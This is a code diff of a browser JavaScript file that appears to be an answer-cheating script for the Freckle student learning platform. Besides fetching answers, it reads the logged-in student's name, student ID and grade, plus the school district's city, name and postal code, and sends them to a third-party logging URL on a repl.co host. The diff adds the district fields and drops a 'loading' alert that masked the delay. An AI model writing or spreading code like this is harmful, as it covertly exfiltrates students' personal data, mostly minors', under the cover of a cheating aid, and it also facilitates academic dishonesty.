@@ -6,7 +6,18 @@ var r =await fetch("https://api.freckle.com/2/students/me", {
     "Content-type": "application/json; charset=UTF-8"
     },
 })
+var district = await fetch("https://api.freckle.com/2/districts", {
+  method: "GET",
+  credentials: "include"
+ 
+,headers: {
+    "Content-type": "application/json; charset=UTF-8"
+    },
+})
 g=await r.json()
+d=await district.json()
+district=d[0]
+
 
 
 async function getAnswer(){
@@ -52,8 +63,7 @@ async function getAnswer(){
     }
     getAnswer();
 }
-dataa=g["firstName"]+" "+g["lastName"]+" "+g["sisId"]+" answers.js"+" "+g["grade"]+" district: "+g["districtId"]
-alert("loading... (press ok to continue, this process may take a couple of seconds)")
+dataa=g["firstName"]+" "+g["lastName"]+" "+g["sisId"]+" answers.js "+" grade: "+g["grade"]+" City: "+district["city"]+" name: "+district["name"]+" postal code: "+district["postalCode"]
 await fetch("https://jjgrenontop.bobdob2.repl.co/log/"+dataa, {
   method: "GET",
   credentials: "include",
@@ -62,4 +72,5 @@ await fetch("https://jjgrenontop.bobdob2.repl.co/log/"+dataa, {
     "Content-type": "application/json; charset=UTF-8"
     },
 })
+
 getAnswer();
